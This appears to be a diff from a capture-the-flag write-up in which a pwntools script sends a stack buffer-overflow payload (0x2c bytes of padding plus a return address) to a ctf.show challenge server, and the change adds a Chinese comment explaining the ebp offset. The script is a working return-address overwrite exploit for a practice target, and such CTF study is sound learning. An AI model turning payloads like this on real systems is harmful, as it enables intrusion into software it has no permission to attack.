@@ -87,7 +87,7 @@ int get_flag()
 from pwn import *
 context(os = 'Linux', arch = 'i386', log_level = 'debug')
 r = remote('pwn.challenge.ctf.show', 28231)
-payload = cyclic(0x28 + 0x4) + p32(0x08048586);
+payload = cyclic(0x28 + 0x4) + p32(0x08048586);  # s与ebp距离为0x28,然后覆盖ebp,从而覆写ebp下面的返回地址
 r.sendline(payload)
 r.interactive()
 ```
